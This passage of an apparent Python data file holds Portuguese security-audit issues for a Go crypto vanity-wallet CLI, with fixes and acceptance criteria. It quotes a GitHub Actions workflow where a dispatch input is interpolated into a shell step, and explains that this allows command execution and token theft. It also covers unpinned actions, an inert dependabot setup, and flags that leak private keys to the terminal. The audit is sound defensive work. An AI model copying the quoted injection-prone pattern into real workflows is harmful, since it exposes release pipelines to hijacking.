        "imagens maliciosas ou exfiltrar o `GITHUB_TOKEN`. O valor é reinjetado nos jobs seguintes "
        "via `needs.create-release.outputs.version`, propagando a injeção para os passos de build.\n\n"
        'O padrão seguro (passar por `env:` e referenciar como "$VAR") já está aplicado '
        "corretamente em `version-bump.yml:130-136` deste mesmo repositório - só não foi replicado "
        "aqui.\n\n"
        "2. **Action não pinada**: `aquasecurity/trivy-action@master` referencia um branch mutável; "
        "qualquer commit no repositório dessa action passa a executar no pipeline sem revisão. Todas "
        "as demais actions do projeto estão pinadas por tag.\n\n"
        '3. **Dependabot inerte**: `.github/dependabot.yml` mantém `package-ecosystem: ""` do '
        "template original, tornando a configuração inválida - nenhuma atualização de dependência e "
        "aberta, apesar de o repositório aparentar te-lo habilitado.",
        "evidencia": "`.github/workflows/release.yaml:39-44`\n"
        "```yaml\nrun: |\n"
        '  if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then\n'
        '    echo "version=${{ github.event.inputs.tag }}" >> $GITHUB_OUTPUT\n'
        "  else\n"
        '    echo "version=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT\n  fi\n```\n\n'
        "`.github/workflows/release.yaml:16-22`\n"
        "```yaml\npermissions:\n  contents: write\n  packages: write\n  id-token: write\n```\n\n"
        "`.github/workflows/docker.yaml:84-85`\n"
        "```yaml\n- name: Run Trivy vulnerability scanner\n  uses: aquasecurity/trivy-action@master\n```\n\n"
        "`.github/dependabot.yml:8`\n"
        '```yaml\n- package-ecosystem: "" # See documentation for possible values\n```\n\n'
        "Padrão correto já usado no repositório, `.github/workflows/version-bump.yml:130-136`:\n"
        "```yaml\nenv:\n  NEW_TAG: ${{ steps.next.outputs.version }}\nrun: |\n"
        '  git tag -a "$NEW_TAG" -m "Release $NEW_TAG"\n```',
        "impacto": "Execução de comandos arbitrarios com permissão de escrita em conteúdo e pacotes, permitindo "
        "publicar binários ou imagens Docker maliciosos sob o nome do projeto. Somado a isso, as 17 "
        "dependências diretas (go-ethereum, btcd/btcec, solana-go, x/crypto) e as próprias actions "
        "ficam sem atualização automática de segurança.",
        "correcao": 'Mover `github.event.inputs.tag` para um bloco `env:` e referência-lo como "$TAG", '
        "validando o formato com regex antes de usar. Pinar `aquasecurity/trivy-action` por SHA de "
        'commit ou tag imutável. Preencher `package-ecosystem: "gomod"` e adicionar uma segunda '
        "entrada `github-actions` no dependabot.yml.",
        "criterios": [
            "Nenhum `${{ github.event.inputs.* }}` aparece dentro de bloco `run:` em qualquer workflow",
            "Um tag contendo aspas e ponto-e-virgula não executa comandos adicionais no runner",
            "Todas as actions de terceiros estão pinadas por tag imutável ou SHA (nenhum `@master` ou `@main`)",
            "`dependabot.yml` declara `gomod` e `github-actions` e o Dependabot abre PRs",
            "Os workflows continuam passando após a mudança",
        ],
    },
    {
        "n": 7,
        "titulo": "[Segurança] Flags inertes expoem chave privada no terminal e --network inválido cai silenciosamente em Ethereum",
        "labels": "security, severity:baixa, cli, usabilidade-segura",
        "problema": "Dois defeitos de baixa severidade no tratamento de flags, ambos com consequência sobre "
        "material sensível:\n\n"
        "1. `--output` e `--format` são registrados no comando raiz mas nunca lidos no caminho de "
        "geração - as únicas leituras existem em `benchmark.go:130-131`, para o subcomando "
        "benchmark. Quem executa `bloco-vgen --prefix abc --output carteiras.json` acredita ter "
        "direcionado o material sensível para um arquivo (que o benchmark cria corretamente com "
        "0600) e, em vez disso, tem a chave privada impressa no terminal - onde vai parar no "
        "scrollback, em `script`/`tee`, em logs de sessão SSH e no histórico de tmux/screen. Nenhum "
        "erro ou aviso é emitido.\n\n"
        "2. `GenerationCriteria.Validate()` não valida o campo `Network`. Com `--network etherium` "
        "(erro de digitação) ou `--network polygon`, a fabrica de geradores cai no `default` e "
        "produz uma chave Ethereum. O fluxo então falha tardiamente em "
        "`validateAddressForNetwork`, e nenhum backup é gravado - o usuário recebe uma chave privada "
        "real, exibida uma única vez no terminal, sem persistência.",
        "evidencia": "`internal/cli/commands.go:102-103` - flags declaradas:\n"
        '```go\nflags.String("output", "", "Output file for results (default: stdout)")\n'
        'flags.String("format", "text", "Output format (text, json, csv)")\n```\n'
        'Nenhuma chamada a `GetString("output")` existe em `commands.go`.\n\n'
        "`internal/cli/commands.go:1672-1674` - o resultado sempre vai ao stdout:\n"
        '```go\nfmt.Printf("Private Key: %s\\n", result.Wallet.PrivateKey)\n'
        'if result.Wallet.Mnemonic != "" {\n'
        '    fmt.Printf("Mnemonic: %s\\n", result.Wallet.Mnemonic)\n}\n```\n\n'
        "`internal/worker/pool.go:94-102` - fallback silencioso:\n"
        "```go\nswitch strings.ToLower(network) {\n"
        'case "bitcoin":  generator = crypto.NewBitcoinGenerator(poolManager)\n'
        'case "solana":   generator = crypto.NewSolanaGenerator(poolManager)\n'
        "default:         generator = crypto.NewEthereumGenerator(poolManager)\n}\n```\n\n"
        "`pkg/wallet/types.go:141-177` - `Validate()` cobre padrão, hex, checksum e MaxAttempts, "
        "mas não `Network`.",
        "impacto": "Chaves privadas persistem em buffers de terminal e em gravações de sessão quando o usuário "
        "acreditava te-las direcionado a um arquivo com permissão restrita. Um erro de digitação em "
        "`--network` gera material criptográfico real que nunca chega ao disco, com risco de perda "
        "se o usuário supuser que o backup foi salvo.",
        "correcao": "Implementar `--output`/`--format` no caminho de geração, gravando com 0600 como "
        "`benchmark.go:983` já faz, ou remove-las do comando raiz. Adicionar validação de `Network` "
        "por lista fechada em `GenerationCriteria.Validate()` (pkg/wallet/types.go:141), falhando "
        "cedo com mensagem clara.",
        "criterios": [
            "`--output arquivo.json` grava o resultado no arquivo com modo 0600 e não imprime a chave privada no stdout, OU a flag foi removida do comando raiz",
            "`--format json` produz JSON válido, OU a flag foi removida",
            "`--network polygon` falha imediatamente com mensagem clara, antes de gerar qualquer chave",
            "Existe teste cobrindo a rejeição de rede inválida",
            "README atualizado na seção 'Current limitations'; `go test ./...` passa",
        ],
    },
]
